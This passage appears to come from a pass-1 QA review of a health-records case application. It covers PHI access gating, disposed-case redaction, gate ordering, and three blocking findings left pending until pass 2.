Confirmed as sound reasoning, not re-reported as discoveries:

- **`FUP-P3-MINT-AFFORDANCE-WIDER-THAN-ITS-DOOR`** — narrowed correctly. The card is now
  gated on the door's own answer for the **de-identified** authority; the identified variant
  needs `app.can_read_case_patient`, which is not on the detail envelope, so the checkbox still
  renders for a caller who will be refused on submit. Closing it needs a backend surface change
  and **must not** be faked by re-deriving the PHI door in the page. The residue is named at
  the call site. **Agreed.**
- **`FUP-P3-DOSSIER-HAS-NO-RECUSAL-ROSTER`** — `recusalDisplay` is hard-`null`
  (`pdf-payload.ts:364`) because `CaseDetail.myRecusal` is the caller's own recusal only.
  Populating it from that would make the artifact vary by minter with none of the A7 exception's
  justification — a **second** A7 exception bought for nothing. **Agreed; the right call.**
- **Disposed-case degradation has no E2E.** `dispose_case_phi` is irreversible against a seed
  ~900 tests depend on, and the harness constructs no case of its own. Covered by pgTAP `368`
  plus a committed disposed fingerprint. **Accepted as a stated bound.** The graceful-degradation
  logic is genuinely reviewable statically and I did review it: `section()` returns null on empty
  HTML (`case.ts:132`), `narrativesSection` filters nulled bodies before mapping,
  `interviewsSection` deliberately keeps metadata and drops only the summary — with the asymmetry
  argued at `case.ts:276-289` — and the disposal notice is framed as a fact, not an error.

---

## 10. Process note — gate ordering

CLAUDE.md § 6 puts QA review at **step 3**, after step 2 declares green. PROGRESS.md records
gate 2 as **⛔ RED (UNRUN)** with 36 did-not-run in a batch P3 never touched, and a full-suite
run still owed. This pass therefore runs **ahead** of its gate, at the lead's explicit
instruction, and is scoped to the half that a churning DB cannot contaminate. Recorded so the
sequence is not later read as a completed step 3. ~~**Pass 2 must not issue a verdict until
gate 2 has declared green on a full run.**~~

⛔ **SUPERSEDED 2026-08-25, struck rather than deleted.** The PO ruling landed *after* this pass
was written and **accepts gate 2 standing at RED (UNRUN)** with its cause on record. Pass 2's real
preconditions are a **committed tree** (satisfied — `2c19ae27` for the docs, `a62a2bf3` for the
specs, which also closes **H-1**) and a **settled DB** (the catalog reconciliation). The stale
sentence stood here while two other documents flagged it elsewhere, which is the drift the
meta-review's R-5 is about: the correction belongs in the file that carries the false claim.

---

## 11. Verdict

**NONE. Pass 1 of 2.**

Three blocking candidates (**C-1**, **C-2**, **C-3**) are recorded with file and line, and
**none of them is withdrawable by anything pass 2 could measure**:

- **C-1**'s only catalog dependency is *which* of three fields `dispose_case_phi` redacts, and
  it survives on any one of the three.
- **C-2**'s catalog dependency (Gotenberg egress) moves its severity, not its existence.
- **C-3** is a pure absence in committed test text. `st_x2` is fetched and never used; the
  recused-member download cell has no test; `case_patient.read` appears in no assertion in
  either layer. A catalog read cannot make an unwritten assertion exist.

On the QA posture stated in the role brief — *a single unmet blocking requirement is
`CHANGES REQUESTED` regardless of how much else is correct* — **C-3 alone would decide this
phase today**, and C-1 is an Art. 18 / Rule 12 hole on top of it. Pass 2 exists to settle § 7
and to confirm C-1's premise against `pg_get_functiondef`, not to reopen the question of
whether findings exist.

⛔ ~~Pass 2 must not issue a verdict until **gate 2 has declared green on a full run** and the
tree is committed (**H-1**).~~ **SUPERSEDED — see the correction under § 10.** Committed tree ✅
(`a62a2bf3` closes H-1) · settled DB = the catalog reconciliation · gate 2 stays RED (UNRUN) by
PO ruling. **Pass 2 issues the verdict.**
